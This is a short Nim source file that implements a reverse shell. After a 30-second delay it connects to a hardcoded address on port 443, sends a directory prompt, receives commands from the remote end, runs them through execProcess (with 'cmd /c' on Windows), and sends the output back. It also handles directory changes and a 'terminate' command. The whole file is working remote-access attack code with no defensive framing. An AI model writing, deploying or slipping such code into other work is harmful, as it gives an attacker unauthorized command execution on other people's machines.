import net, strutils, osproc, os, sysinfo

var ip = "127.0.0.1"
var port = 443

# Sleep for 30 seconds before connecting to the server
sleep(30000)

# Create a new socket and connect to the server
var socket = newSocket()
socket.connect(ip, Port(port))

while true:
  try:

    var prompt = os.getCurrentDir() & "> "

    send(socket, prompt)

    var cmd = recvLine(socket)

    var cmd_output = ""

    if getOsName().contains("Linux"):
      cmd_output = execProcess(cmd)

    elif getOsName().contains("Windows"):
      cmd_output = execProcess("cmd /c" & cmd)

    cmd = cmd.strip()

    if cmd.startsWith("terminate"):
      send(socket, "[*] Exiting ...")
      break

    if cmd.contains("cd"):
      var new_dir = cmd.split()[1]
      try:
        os.setCurrentDir(new_dir)
      except OSError as e:
        send(socket, repr(e) & "\n")

    send(socket, cmd_output)

  except:
    raise

socket.close
